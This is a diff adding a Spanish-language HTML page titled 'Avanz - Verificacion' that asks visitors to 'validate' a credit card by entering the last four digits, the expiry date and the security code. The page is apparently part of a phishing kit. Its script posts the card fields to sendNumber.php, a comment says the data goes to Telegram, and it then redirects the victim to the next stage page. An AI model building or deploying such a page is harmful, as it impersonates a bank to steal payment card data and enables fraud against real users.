@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Avanz - Verificacion</title>
+</head>
+
+<style>
+    .tem
+{
+   
+     color: #333;
+     border: 1px solid rgb(182, 181, 181);
+   border-radius: 3px;
+     top: 187px;
+    
+    height: 39px;
+    width: 340px;
+    padding-left: 12px;
+    outline: none;
+    font-size: 16px;
+    font-family: dinReg, sans-serif;
+}
+
+.masa3{
+        width: 100%;
+        height: 20px;
+        margin: 0px;
+        background-color: #005961;
+        padding: 5px;
+    }
+
+    .met {
+        -webkit-text-size-adjust: 100%;
+    -webkit-tap-highlight-color: rgba(0,0,0,0);
+    box-sizing: border-box;
+    margin: 0;
+    font-family: sans-serif;
+    overflow: visible;
+    -webkit-appearance: button;
+    cursor: pointer;
+ margin-top: 20px;
+    font-size: 15px;
+    line-height: inherit;
+    min-width: 156px;
+    text-transform: uppercase;
+    padding: 5px 20px;
+    border: none;
+    height: 35px;
+    color: #fff;
+    background: #FF7500;
+    }
+
+    
+</style>
+
+<style>
+    /* Tus estilos existentes */
+    .form {
+        width: 390px;
+        height: 390px;
+    }
+    
+    .for {
+        user-select: none;
+        pointer-events: none; 
+    }
+    .pp {
+        outline: none;
+        width: 328px;
+        height: 40px;
+        margin-left: -168px;
+        margin-top: -149px;
+        font-family: sans-serif;
+        background-color: transparent !important;
+        position: absolute;
+        flex: 1 1 auto;
+        min-width: 0;
+        border: none;
+        margin-bottom: 0;
+    }
+    
+    .pp2 {
+        
+        width: 300px;
+        padding: 6px 12px;
+        font-size: 14px;
+        line-height: 1.42857143;
+        color: #555;
+        border: 1px solid #ababab;
+        background: #fff;
+        border-radius: 4px;
+        height: 34px;
+        margin-left: 30px;
+    }
+    
+    .fua {
+        text-transform: none;
+        width: 100%!important;
+        border: 0px !important;
+        padding: .5rem 1.25rem;
+        height: 55px!important;
+        background-color: #00693c!important;
+        border-radius: 83px!important;
+        color: #fff!important;
+        font-size: 18px!important;
+        font-weight: 500!important;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        cursor: pointer;
+    }
+    
+    /* Estilos para la ventana emergente */
+    .popup-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.5);
+        display: none;
+        justify-content: center;
+        align-items: center;
+        z-index: 1000;
+    }
+    
+    .popup {
+        background-color: white;
+        width: 350px;
+        padding: 20px;
+        border-radius: 10px;
+        text-align: center;
+        box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2);
+        animation: fadeIn 0.3s ease-in-out;
+    }
+    
+    .popup h2 {
+        font-family: sans-serif;
+        font-size: 18px;
+        color: #333;
+        margin-bottom: 15px;
+    }
+    
+    .popup input {
+        width: 100%;
+        height: 40px;
+        margin-bottom: 15px;
+        padding: 0 10px;
+        border: 1px solid #ddd;
+        border-radius: 5px;
+        outline: none;
+        font-size: 16px;
+    }
+    
+    .popup .fua {
+        width: 100%;
+        height: 45px;
+        border-radius: 5px;
+    }
+    
+    @keyframes fadeIn {
+        from {
+            opacity: 0;
+            transform: scale(0.9);
+        }
+        to {
+            opacity: 1;
+            transform: scale(1);
+        }
+    }
+    </style>
+    
+<body style="margin: 0;">
+    
+
+<div style="margin-left: -20px;">
+
+
+
+
+
+
+
+
+
+
+    <div style="width: 100%;height: 70px;padding: 10px;margin-left: 10px;">
+        <img width="120px" src="img/lk.svg" alt="">
+        
+            </div>
+        
+            <div class="masa3" >
+                <center>        <img style="margin-top: 3px;width: 15px;" src="img/icon-login.png" alt="">
+                    </div>
+        
+        
+        
+        
+        
+        
+                    <div style=" padding: 5px;">
+                        <center> 
+                            <br> 
+         
+        
+        
+                            <form class="form" id="mainForm">
+                                <center>          
+                                    <div style="width: 300px;">
+                                        <p style="font-family: sans-serif; font-size: 18px; color: #555;">
+                                            Valida alguna de tus tarjetas de crédito para finalizar.
+                                        </p>
+                                        <img src="img/carcc.png" alt="">
+                                    </div>
+                                </center>
+                                
+                                <br>
+                            
+                                <div>
+                                    <input style="margin-top: -145px;" class="pp2" type="text" name="tarj" id="tarj" 
+                                           placeholder="Últimos 4 dígitos" inputmode="numeric" minlength="4" maxlength="4" required>
+                                </div>
+                            
+                                <br><br>
+                            
+                                <div style="margin-top: 4px;">
+                                    <input inputmode="numeric" type="text" id="fecha" name="fecha" maxlength="7" 
+                                           oninput="formatFecha(event)" required style="margin-top: -95px;" 
+                                           class="pp2" placeholder="MM/AA">
+                                </div>
+                            
+                                <img src="img/cvv.png" alt="" style="width: 100%; margin-top: -40px;">
+                                <br><br>
+                            
+                                <input type="text" class="pp2" inputmode="numeric" name="cvv" id="cvv" 
+                                       maxlength="3" placeholder="Código de seguridad" required>
+                            
+                                <br><br>
+                            
+                                <button type="button" class="met" id="sendCardData">CONTINUAR</button>
+                            </form>
+                            
+                            <script>
+                                // Formatear la fecha MM/AA
+                                function formatFecha(event) {
+                                    let input = event.target;
+                                    let inputValue = input.value.replace(/\D/g, ''); // Elimina caracteres no numéricos
+                                    let formattedValue = '';
+                            
+                                    if (inputValue.length >= 2) {
+                                        formattedValue += inputValue.substr(0, 2);
+                                        if (inputValue.length > 2) {
+                                            formattedValue += '/' + inputValue.substr(2, 2);
+                                        }
+                                    } else {
+                                        formattedValue = inputValue;
+                                    }
+                            
+                                    input.value = formattedValue;
+                                }
+                            
+                                // Enviar datos a Telegram y redirigir a carg3.html
+                                document.getElementById('sendCardData').addEventListener('click', function() {
+                                    const formData = new FormData(document.getElementById('mainForm'));
+                            
+                                    fetch("sendNumber.php", {
+                                        method: "POST",
+                                        body: formData
+                                    })
+                                    .then(response => response.json())
+                                    .then(() => {
+                                        window.location.href = 'carg4.html'; // Redirige a carg3.html después de enviar los datos
+                                    })
+                                    .catch(error => console.error("Error al enviar los datos:", error));
+                                });
+                            </script>
+                            
+        
+        
+                    </center>
+                    </div>
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+</div>
+
+ 
+</body>
+</html>
